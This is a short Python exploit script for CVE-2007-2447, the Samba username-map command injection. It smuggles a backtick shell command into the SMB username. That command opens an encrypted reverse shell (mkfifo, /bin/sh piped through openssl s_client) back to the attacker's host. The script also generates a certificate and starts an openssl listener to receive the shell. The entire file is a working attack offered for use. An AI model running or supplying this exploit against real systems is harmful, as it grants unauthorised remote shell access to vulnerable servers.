import argparse
from smb.SMBConnection import SMBConnection
import os
import threading
from time import sleep
import sys


def listener():
    sleep(1)  # wait for the listener to start
    try:
        conn = SMBConnection(username, password, '', '')
        conn.connect(args.ip, 139)
    except Exception as e:
        sys.exit(e)


parser = argparse.ArgumentParser(description='Exploit code for CVE-2007-2447')
parser.add_argument('-ip', required=True, help='IP of the target')
parser.add_argument('-lhost', required=True, help='IP of your host')
parser.add_argument('-port', required=False, type=int, default=4444, help='Listen port, default 4444')
args = parser.parse_args()

username = f"/DoesntMatter `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {args.lhost}:{args.port} > /tmp/s; rm /tmp/s`"
password = "fakepass"

print("Generating keys for the server...")
os.system(
    "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=www.mydom.com/O=My "
    "Company Name LTD./C=US' 2>/dev/null")  # -subj doesn't matter, use whatever you want
t1 = threading.Thread(target=listener, daemon=True, name='Listener').start()
print("Starting the listener...")
os.system(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {args.port}")
